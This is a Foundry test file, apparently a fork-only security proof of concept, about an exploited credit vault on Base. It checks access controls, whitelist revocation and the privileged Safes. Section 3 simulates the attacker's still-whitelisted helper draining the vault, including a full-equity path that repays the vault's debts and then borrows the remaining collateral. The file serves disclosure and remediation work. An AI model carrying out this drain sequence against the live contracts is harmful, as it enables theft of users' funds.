// SPDX-License-Identifier: MIT
// C2-02 — Base credit vault 0xD1895f2019c2152FC2b9022D57f19198c4CFCABC
// Fork-only PoC: verifies (a) no fresh-unprivileged extraction path exists,
// (b) the original attacker's residual capability (still-whitelisted helper)
// and its exact Aave-health-bounded maximum, (c) remediation (whitelist revoke).
// READ-ONLY research: this test only runs on a local fork; nothing is broadcast.
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IVault {
    function owner() external view returns (address);
    function pool() external view returns (address);
    function minHealth() external view returns (uint256);
    function whitelist(address) external view returns (bool);
    function minToken(address) external view returns (uint256);
    function aToken(address) external view returns (address);
    function debtToken(address) external view returns (address);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external;
    function repay(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external;
    function initialize(address pool_) external;
    function transferOwnership(address) external;
    function renounceOwnership() external;
}

interface IHelper {
    function owner() external view returns (address);
    function __withdraw(address asset, uint256 amount) external;
    function initialize() external;
    function transferOwnership(address) external;
    function renounceOwnership() external;
}

interface IPool {
    function getUserAccountData(address user)
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256);
}

interface IDataProvider {
    function getReserveConfigurationData(address asset)
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, bool, bool, bool, bool, bool);
}

interface IDataProviderTokens {
    function getReserveTokensAddresses(address asset)
        external
        view
        returns (address aTokenAddress, address stableDebtTokenAddress, address variableDebtTokenAddress);
}

interface IOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IProxyAdmin {
    function owner() external view returns (address);
}

interface ISafe {
    function getThreshold() external view returns (uint256);
    function getOwners() external view returns (address[] memory);
    function getModulesPaginated(address start, uint256 pageSize)
        external
        view
        returns (address[] memory array, address next);
}

contract BaseVaultD189Test is Test {
    // ---- targets (Base mainnet) ----
    address constant VAULT = 0xD1895f2019c2152FC2b9022D57f19198c4CFCABC;
    address constant HELPER = 0xcdFE91301356da873562EF513828a60dba1F569d;
    address constant ATTACKER = 0x0B5126e1bc27C0de77e02e97945760A674EdB034;
    address constant COPYCAT_HELPER = 0x13Fed10846B5fE35601452731d7b847adC7722a9;
    address constant COPYCAT_EOA = 0x0820DC0cf398d4ee78a3dEc5ffbb5357f4586278;
    address constant OWNER_SAFE = 0x6b27512a5943Ed327f6cb6C3EC1f0398229f42C4;
    address constant PROXYADMIN_SAFE = 0x47a60e3D6121B216cD22984df5976a41e15baF77;
    address constant VAULT_PROXYADMIN = 0x490ca969b43B1Ab869B5959A7b3919Cc2c37C4e6;
    address constant HELPER_PROXYADMIN = 0x3065D79077e2dBc36D78d9b993cE090B1b7552E6;
    address constant SIBLING = 0x416Ec2cA21a38CbCFeAcD6a14532B3F348356d23;
    // ---- tokens / aave ----
    address constant AWETH = 0xD4a0e0b9149BCee3C920d2E00b5dE09138fd8bb7;
    address constant AWSTETH = 0x99CBC45ea5bb7eF3a5BC08FB1B7E56bB2442Ef0D;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address constant EURC = 0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42;
    address constant AERO = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address constant POOL = 0xA238Dd80C259a72e81d7e4664a9801593F98d1c5;
    address constant ORACLE = 0x2Cc0Fc26eD4563A5ce5e8bdcfe1A2878676Ae156;
    address constant DATAPROVIDER = 0x0F43731EB8d45A581f4a36DD74F5f358bc90C73A;

    address constant FRESH = 0x2222222222222222222222222222222222222222;
    bytes4 constant ERR_HF = 0x6679996d; // HealthFactorLowerThanLiquidationThreshold()
    bytes4 constant SEL_HELPER_WITHDRAW = 0x9a39f8dd; // __withdraw(address,uint256)
    bytes4 constant SEL_WHITELIST_SET = 0x38edc837; // whitelist setter(address,uint256)

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("BASE_RPC_URL", string("https://base-rpc.publicnode.com"))
        );
        console2.log("fork block", block.number);
    }

    // ------------------------------------------------------------------
    // 1. Live state: whitelist/ownership still as reported
    // ------------------------------------------------------------------
    function test_state_live() public view {
        assertEq(IVault(VAULT).owner(), OWNER_SAFE, "vault owner");
        assertTrue(IVault(VAULT).whitelist(HELPER), "attacker helper still whitelisted");
        assertFalse(IVault(VAULT).whitelist(COPYCAT_HELPER), "copycat not whitelisted");
        assertEq(IVault(VAULT).minHealth(), 0, "minHealth");
        assertEq(IHelper(HELPER).owner(), ATTACKER, "helper owner");
        assertEq(IVault(VAULT).minToken(WETH), 10e18, "minToken(WETH)");
        assertEq(IVault(VAULT).aToken(WETH), AWETH, "aToken(WETH)");
        assertGt(IERC20(AWETH).balanceOf(VAULT), 11_000e18, "vault aWETH");
    }

    // ------------------------------------------------------------------
    // 2. Fresh unprivileged: every value-moving entry point reverts
    // ------------------------------------------------------------------
    function test_fresh_direct_borrow_reverts() public {
        vm.prank(FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(VAULT).borrow(AWETH, 1e18, 0, 0, FRESH);
    }

    function test_fresh_borrow_with_whitelisted_receiver_reverts() public {
        // proves the gate is on msg.sender, not on the receiver
        vm.prank(FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(VAULT).borrow(AWETH, 1e18, 0, 0, HELPER);
    }

    function test_fresh_withdraw_and_repay_revert() public {
        vm.startPrank(FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(VAULT).withdraw(WETH, 1e18, FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(VAULT).repay(WETH, 1e18, 2, FRESH);
        vm.stopPrank();
    }

    function test_fresh_helper_functions_revert() public {
        vm.startPrank(FRESH);
        vm.expectRevert(bytes("!O2"));
        IHelper(HELPER).__withdraw(AWETH, 1e18);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        IHelper(HELPER).initialize();
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        IHelper(HELPER).transferOwnership(FRESH);
        vm.stopPrank();
    }

    function test_fresh_vault_owner_functions_revert() public {
        vm.startPrank(FRESH);
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        IVault(VAULT).transferOwnership(FRESH);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        IVault(VAULT).initialize(POOL);
        (bool ok, bytes memory ret) =
            VAULT.call(abi.encodeWithSelector(SEL_WHITELIST_SET, FRESH, uint256(1)));
        assertFalse(ok, "whitelist setter must be owner-gated");
        assertEq(bytes4(ret), bytes4(0x08c379a0), "err must be Error(string)");
        vm.stopPrank();
    }

    function test_fresh_proxy_upgrade_reverts() public {
        // ProxyAdmin (Aave BGD variant) is Ownable -> fresh caller cannot upgrade the vault
        (bool ok, bytes memory ret) = VAULT_PROXYADMIN.call(
            abi.encodeWithSignature("upgrade(address,address)", VAULT, FRESH)
        );
        assertFalse(ok, "upgrade must be owner-gated");
        assertEq(bytes4(ret), bytes4(0x08c379a0), "err must be Error(string)");
        (bool ok2, bytes memory ret2) = VAULT_PROXYADMIN.call(
            abi.encodeWithSignature("upgradeAndCall(address,address,bytes)", VAULT, FRESH, bytes(""))
        );
        assertFalse(ok2, "upgradeAndCall must be owner-gated");
        assertEq(bytes4(ret2), bytes4(0x08c379a0), "err must be Error(string)");
        // TransparentUpgradeableProxy admin() reverts for non-admin callers
        (bool ok3,) = VAULT.call(abi.encodeWithSignature("admin()"));
        assertFalse(ok3, "admin() must revert for non-admin");
    }

    function test_fresh_supply_cannot_move_vault_funds() public {
        // supply() is the only open entry point but it pulls the CALLER's tokens;
        // a fresh caller with no tokens/approval cannot use it, and it never pays out.
        vm.prank(FRESH);
        vm.expectRevert(bytes("SafeERC20: low-level call failed"));
        IVault(VAULT).supply(WETH, 1e18, FRESH, 0);
    }

    // ------------------------------------------------------------------
    // 3. Residual: original attacker's helper is still live
    // ------------------------------------------------------------------
    function test_attacker_residual_path_works() public {
        uint256 before = IERC20(AWETH).balanceOf(HELPER);
        vm.prank(ATTACKER);
        IHelper(HELPER).__withdraw(AWETH, 100e18);
        // aToken scaled-balance rounding can add 1 wei
        assertApproxEqAbs(IERC20(AWETH).balanceOf(HELPER) - before, 100e18, 1, "helper received aWETH");
    }

    /// Binary-searches the exact max aWETH borrowable by the attacker's helper
    /// on the live Aave-health bound; each probe is rolled back via snapshots.
    function test_residual_max_borrow_boundary() public {
        uint256 vaultBal = IERC20(AWETH).balanceOf(VAULT);
        uint256 lo = 7_000e18; // known-good
        uint256 hi = vaultBal; // known-bad (> collateral)
        while (hi - lo > 1e15) {
            uint256 mid = (lo + hi) / 2;
            (bool ok,) = _probe(mid);
            if (ok) lo = mid;
            else hi = mid;
        }
        (bool okHi, bytes memory retHi) = _probe(hi);
        assertFalse(okHi, "hi must fail");
        assertEq(bytes4(retHi), ERR_HF, "revert must be Aave HealthFactorLowerThanLiquidationThreshold");
        assertTrue(lo >= 7_000e18 && lo <= 9_500e18, "max in plausible range");

        // theoretical bound: remaining collateral value >= debt / LT
        (, uint256 debt,,,, ) = IPool(POOL).getUserAccountData(VAULT);        uint256 price = IOracle(ORACLE).getAssetPrice(WETH);
        (, , uint256 ltBps,,,,,,,) = IDataProvider(DATAPROVIDER).getReserveConfigurationData(WETH);
        uint256 maxUsd8 = vaultBal * price / 1e18 - debt * 10_000 / ltBps;
        uint256 maxTheo = maxUsd8 * 1e18 / price;
        uint256 diff = lo > maxTheo ? lo - maxTheo : maxTheo - lo;
        assertLt(diff * 10_000 / maxTheo, 100, "empirical within 1% of theory");

        console2.log("vault aWETH balance  :", vaultBal);
        console2.log("max borrowable aWETH  :", lo);
        console2.log("theoretical max aWETH :", maxTheo);
        console2.log("aWETH price USD 8dec  :", price);
        console2.log("max extractable USD   :", lo * price / 1e18 / 1e8);
        console2.log("Aave LT (bps)         :", ltBps);
        console2.log("Aave debt USD 8dec    :", debt);
    }

    function _probe(uint256 amount) internal returns (bool ok, bytes memory ret) {
        uint256 snap = vm.snapshotState();
        vm.prank(ATTACKER);
        (ok, ret) = HELPER.call(abi.encodeWithSelector(SEL_HELPER_WITHDRAW, AWETH, amount));
        vm.revertToState(snap);
    }

    /// Full-equity path: borrow to the HF bound, repay the vault's Aave debt with the
    /// whitelisted helper (repay is whitelist-gated and the helper passes), then borrow
    /// the remaining aWETH. Proves net extraction up to the vault's whole equity.
    /// The repayment tokens are obtained in production by swapping the borrowed aWETH
    /// on Base DEXs; they are dealt here for determinism (swap cost ~0.1% not modelled).
    function test_residual_full_equity_path() public {
        uint256 vaultBal = IERC20(AWETH).balanceOf(VAULT);

        // step 1 — borrow to the Aave HF bound (no capital needed)
        uint256 lo = 7_000e18;
        uint256 hi = vaultBal;
        while (hi - lo > 1e15) {
            uint256 mid = (lo + hi) / 2;
            (bool ok,) = _probe(mid);
            if (ok) lo = mid;
            else hi = mid;
        }
        vm.prank(ATTACKER);
        IHelper(HELPER).__withdraw(AWETH, lo);
        uint256 remaining = IERC20(AWETH).balanceOf(VAULT);
        assertGt(remaining, 1_000e18, "remaining collateral");

        // read the vault's debts (USDC + cbBTC + EURC) via the vault's own debtToken mapping
        address vdUsdc = IVault(VAULT).debtToken(USDC);
        address vdCbtc = IVault(VAULT).debtToken(CBBTC);
        address vdEurc = IVault(VAULT).debtToken(EURC);
        uint256 usdcDebt = IERC20(vdUsdc).balanceOf(VAULT);
        uint256 cbtcDebt = IERC20(vdCbtc).balanceOf(VAULT);
        uint256 eurcDebt = IERC20(vdEurc).balanceOf(VAULT);
        console2.log("USDC debt 6dec :", usdcDebt);
        console2.log("cbBTC debt 8dec:", cbtcDebt);
        console2.log("EURC debt 6dec :", eurcDebt);

        // step 2 — the vault's repay() consumes the token balance held BY THE VAULT
        // (the transferFrom from the caller is a 0-amount no-op in the live code).
        // The attacker therefore injects the debt tokens via a plain ERC-20 transfer,
        // using proceeds from the aWETH already borrowed; dealt here for determinism.
        deal(USDC, VAULT, usdcDebt + 1e6);
        deal(CBBTC, VAULT, cbtcDebt + 1e8);
        deal(EURC, VAULT, eurcDebt + 1e6);
        console2.log("vault  USDC before:", IERC20(USDC).balanceOf(VAULT));
        vm.startPrank(HELPER);
        IVault(VAULT).repay(USDC, usdcDebt, 2, VAULT);
        IVault(VAULT).repay(CBBTC, cbtcDebt, 2, VAULT);
        IVault(VAULT).repay(EURC, eurcDebt, 2, VAULT);
        vm.stopPrank();
        console2.log("vault  USDC after:", IERC20(USDC).balanceOf(VAULT));
        console2.log("vault  USDC debt after:", IERC20(vdUsdc).balanceOf(VAULT));
        console2.log("vault  cbBTC debt after:", IERC20(vdCbtc).balanceOf(VAULT));
        console2.log("vault  EURC debt after:", IERC20(vdEurc).balanceOf(VAULT));
        (, uint256 debtAfter,,,,) = IPool(POOL).getUserAccountData(VAULT);
        assertLt(debtAfter, 100_000e8, "debt reduced >98%");
        console2.log("debt after repay USD 8dec:", debtAfter);

        // step 3 — borrow the remaining collateral (keep a small HF buffer)
        uint256 take = remaining > 25e18 ? remaining - 25e18 : remaining;
        vm.prank(ATTACKER);
        IHelper(HELPER).__withdraw(AWETH, take);

        uint256 left = IERC20(AWETH).balanceOf(VAULT);
        assertLt(left, 30e18, "vault drained to HF dust");
        uint256 totalTaken = IERC20(AWETH).balanceOf(HELPER);
        uint256 price = IOracle(ORACLE).getAssetPrice(WETH);
        console2.log("vault aWETH at start:", vaultBal);
        console2.log("total aWETH taken   :", totalTaken);
        console2.log("vault aWETH left    :", left);
        console2.log("gross USD 8dec      :", totalTaken * price / 1e18);
        console2.log("repaid USDC 6dec    :", usdcDebt);
        console2.log("repaid cbBTC 8dec   :", cbtcDebt);
    }

    function _reserveTokens(address asset)
        internal
        view
        returns (address aToken_, address stableDebt_, address variableDebt_)
    {
        (aToken_, stableDebt_, variableDebt_) =
            IDataProviderTokens(DATAPROVIDER).getReserveTokensAddresses(asset);
    }

    // ------------------------------------------------------------------
    // 4. Remediation: revoking the helper's whitelist closes the path
    // ------------------------------------------------------------------
    function test_whitelist_revocation_closes_residual() public {
        assertTrue(IVault(VAULT).whitelist(HELPER));
        vm.prank(OWNER_SAFE);
        (bool ok,) = VAULT.call(abi.encodeWithSelector(SEL_WHITELIST_SET, HELPER, uint256(0)));
        assertTrue(ok, "safe revoke call");
        assertFalse(IVault(VAULT).whitelist(HELPER), "whitelist revoked");
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("!W"));
        IHelper(HELPER).__withdraw(AWETH, 1e18);
    }

    // ------------------------------------------------------------------
    // 5. Privileged surfaces: owner Safe and ProxyAdmin Safe
    // ------------------------------------------------------------------
    function test_privileged_safes() public view {
        // vault ProxyAdmin owner is a *different* 3-of-8 Safe
        assertEq(IProxyAdmin(VAULT_PROXYADMIN).owner(), PROXYADMIN_SAFE);
        assertEq(ISafe(PROXYADMIN_SAFE).getThreshold(), 3);
        assertEq(ISafe(PROXYADMIN_SAFE).getOwners().length, 8);
        // vault owner Safe is 3-of-7, no modules, no guard
        assertEq(ISafe(OWNER_SAFE).getThreshold(), 3);
        assertEq(ISafe(OWNER_SAFE).getOwners().length, 7);
        (address[] memory mods,) = ISafe(OWNER_SAFE).getModulesPaginated(address(1), 10);
        assertEq(mods.length, 0, "no modules");
        // helper ProxyAdmin is owned by the attacker EOA
        assertEq(IProxyAdmin(HELPER_PROXYADMIN).owner(), ATTACKER);
    }

    // ------------------------------------------------------------------
    // 6. Sibling vault 0x416Ec2cA...: funds held, whitelist path closed
    // ------------------------------------------------------------------
    function test_sibling_no_fresh_path() public {
        assertFalse(IVault(SIBLING).whitelist(HELPER), "helper not whitelisted on sibling");
        assertFalse(IVault(SIBLING).whitelist(COPYCAT_HELPER), "copycat not whitelisted");
        assertEq(IVault(SIBLING).owner(), OWNER_SAFE, "same owner safe");
        assertGt(IERC20(AERO).balanceOf(SIBLING), 1_000_000e18, "sibling holds AERO");
        vm.prank(FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(SIBLING).borrow(AWETH, 1e18, 0, 0, FRESH);
        vm.prank(FRESH);
        vm.expectRevert(bytes("!W"));
        IVault(SIBLING).withdraw(AWETH, 1e18, FRESH);
    }

    // ------------------------------------------------------------------
    // 7. Copycat attempt (real world, 2026-10-05 block 52,210,655/63) reverted
    // ------------------------------------------------------------------
    function test_copycat_helper_not_whitelisted() public {
        assertFalse(IVault(VAULT).whitelist(COPYCAT_HELPER), "copycat helper not whitelisted");
        // its callBorrow path calls vault.borrow -> !W
        vm.prank(COPYCAT_EOA);
        vm.expectRevert(bytes("!W"));
        IVault(VAULT).borrow(AWETH, 1e18, 0, 0, COPYCAT_HELPER);
    }
}
